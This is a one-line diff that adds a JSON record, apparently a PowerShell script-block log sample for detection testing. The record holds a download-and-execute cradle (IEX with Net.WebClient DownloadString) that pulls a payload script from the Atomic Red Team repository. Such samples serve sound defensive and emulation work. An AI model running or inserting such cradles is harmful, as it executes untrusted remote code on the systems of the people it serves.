@@ -1,0 +1,1 @@
+{"ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/powershell_payload.ps1')"}
